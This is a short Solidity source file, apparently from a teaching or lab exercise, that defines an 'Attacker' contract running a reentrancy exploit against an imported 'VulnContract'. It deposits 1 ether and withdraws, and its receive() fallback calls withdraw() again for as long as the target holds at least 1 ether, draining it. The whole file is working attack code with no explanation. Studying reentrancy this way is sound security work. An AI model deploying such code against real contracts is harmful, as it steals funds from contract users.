//SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

import "./VulnContract.sol";

contract Attacker {
    VulnContract public vulnC;
    address owner;

    constructor(address _vulnContractAddress) {
        vulnC = VulnContract(_vulnContractAddress);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT THE OWNER");
        _;
    }

    receive() external payable {
        if (address(vulnC).balance >= 1 ether) {
            vulnC.withdraw();
        }
    }

    function startAttack() external payable onlyOwner {
        require(msg.value >= 1 ether, "Not enought Ether");
        vulnC.deposite{value: 1 ether}();
        vulnC.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
